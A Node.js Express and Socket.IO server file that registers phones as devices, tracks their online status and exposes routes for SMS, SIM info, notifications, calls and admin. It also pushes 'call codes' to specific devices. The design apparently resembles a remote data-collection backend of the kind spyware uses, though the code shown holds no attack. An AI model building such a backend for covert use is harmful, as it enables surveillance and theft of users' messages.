// 📁 server.js
import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import { connectDB } from "./config/db.js";

// 🧩 Import all routes
import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

// 🌿 Environment setup
dotenv.config();
connectDB();

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// ✅ Maintain connected device sockets
const deviceSockets = new Map();

// 🧠 SOCKET.IO Logic
io.on("connection", (socket) => {
  console.log("🟢 Client connected:", socket.id);
  let currentDeviceId = null;

  // ✅ Device registers itself
  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) return;
    console.log(`📱 Registered Device: ${uniqueid}`);
    currentDeviceId = uniqueid;
    deviceSockets.set(uniqueid, socket.id);
    socket.join(uniqueid);
    saveLastSeen(uniqueid, "Online");
  });

  // ✅ Device manually pings status
  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;
    console.log(`⚡ ${uniqueid} → ${connectivity}`);
    saveLastSeen(uniqueid, connectivity);
    io.emit("deviceStatus", { uniqueid, connectivity, updatedAt: new Date() });
  });

  // ✅ Device disconnects (auto offline)
  socket.on("disconnect", () => {
    console.log("🔴 Client disconnected:", socket.id);
    if (currentDeviceId) {
      console.log(`📴 ${currentDeviceId} went Offline`);
      deviceSockets.delete(currentDeviceId);
      io.emit("deviceStatus", {
        uniqueid: currentDeviceId,
        connectivity: "Offline",
        updatedAt: new Date(),
      });
      saveLastSeen(currentDeviceId, "Offline");
      currentDeviceId = null;
    }
  });
});

// 🔄 Save Last Seen Logic
async function saveLastSeen(deviceId, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;
    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.error("❌ Error saving last seen:", err.message);
  }
}

// 🔔 Function to send call code data to specific device via socket
export async function sendCallCodeToDevice(uniqueid, callData) {
  const socketId = deviceSockets.get(uniqueid);
  if (socketId) {
    console.log(`📤 Sending call code to ${uniqueid}:`, callData);
    io.to(socketId).emit("callCodeUpdate", callData);
  } else {
    console.warn(`⚠️ Device ${uniqueid} is offline or not connected.`);
  }
}

// 🏠 Base Route
app.get("/", (req, res) => {
  res.send("🚀 Devices API with Live Socket & LastSeen Tracking is running!");
});

// 🧭 Routes
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);

// ❌ 404 + Global Error
app.use((req, res) => res.status(404).json({ success: false, message: "Route not found" }));
app.use((err, req, res, next) => {
  console.error("Unhandled error:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
